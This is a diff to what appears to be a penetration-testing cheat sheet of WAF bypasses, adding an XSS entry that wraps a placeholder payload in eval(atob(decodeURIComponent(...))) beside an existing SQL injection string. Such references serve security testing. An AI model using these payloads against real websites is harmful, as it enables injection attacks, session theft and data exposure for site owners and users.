@@ -2936,6 +2936,10 @@ Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](
 ```
 "; select * from TARGET_TABLE --
 ```
+- [XSS Bypass](https://github.com/kmkz/Pentesting/blob/master/Pentest-Cheat-Sheet#L285) by [@kmkz](https://twitter.com/kmkz_security)
+```
+<script>eval(atob(decodeURIComponent("payload")))//
+```
 
 ### Barracuda 
 - Cross Site Scripting by [@WAFNinja](https://waf.ninja)
